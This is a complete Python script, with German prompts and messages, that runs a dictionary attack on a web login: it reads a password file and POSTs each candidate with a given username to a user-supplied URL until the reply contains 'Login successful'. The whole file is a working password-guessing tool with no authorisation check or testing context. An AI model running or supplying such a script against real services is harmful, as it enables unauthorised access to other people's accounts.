import requests
import os
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_user_input():
    path = input("Geben Sie den Pfad zur passwords.txt-Datei ein: ")
    if not os.path.isfile(path):
        logging.error("Fehler: Datei nicht gefunden")
        exit(1)
        
    url = input("Geben Sie die URL des Servers ein: ")
    if not url.startswith("http"):
        logging.error("Fehler: Ungültige URL")
        exit(1)
        
    username = input("Geben Sie den Benutzernamen ein: ")
    if not username:
        logging.error("Fehler: Benutzername darf nicht leer sein")
        exit(1)

    return path, url, username

def main():
    path, url, username = get_user_input()

    try:
        with open(path, 'r') as f:
            passwords = f.read().splitlines()
    except Exception as e:
        logging.error(f"Fehler beim Lesen der Datei: {e}")
        exit(1)

    for password in passwords:
        logging.info(f"Versuche Passwort: {password}")
        try:
            response = requests.post(url, data={"username": username, "password": password})
            if response.status_code != 200:
                logging.warning(f"Unerwarteter Statuscode: {response.status_code}")
                continue
            
            if "Login successful" in response.text:
                logging.info(f"Erfolgreiches Login mit Passwort: {password}")
                break
            else:
                logging.info(f"Fehlgeschlagen mit Passwort: {password}")
        except requests.RequestException as e:
            logging.error(f"Fehler bei der Anfrage: {e}")
            continue

if __name__ == "__main__":
    main()
